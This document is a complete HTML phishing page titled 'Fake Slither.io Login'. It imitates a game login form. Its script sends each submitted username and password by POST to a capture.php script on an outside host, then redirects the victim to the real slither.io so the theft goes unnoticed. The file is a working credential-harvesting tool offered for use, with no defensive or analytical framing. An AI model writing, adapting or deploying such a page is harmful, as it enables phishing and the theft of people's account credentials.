<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Slither.io Login</title>
    <style>
        body {
            background-color: #282C34;
            color: #61DAFB;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
        }
        .login-box {
            background: #222;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        input {
            padding: 10px;
            margin: 10px;
            width: 90%;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px;
            background-color: #61DAFB;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Login</h1>
    <div class="login-box">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Enter Username" required><br>
            <input type="password" id="password" placeholder="Enter Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();  // Prevent form from reloading the page

            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Send credentials to the capture.php script
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://slitherio.42web.io/capture.php", true);  // Send to your PHP server
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));

            // Redirect to the real slither.io site after capturing credentials
            xhr.onload = function() {
                if (xhr.status === 200) {
                    window.location.href = "https://slither.io";  // Redirect to the actual Slither.io site
                } else {
                    alert("Error sending data.");
                }
            };
        });
    </script>
</body>
</html>
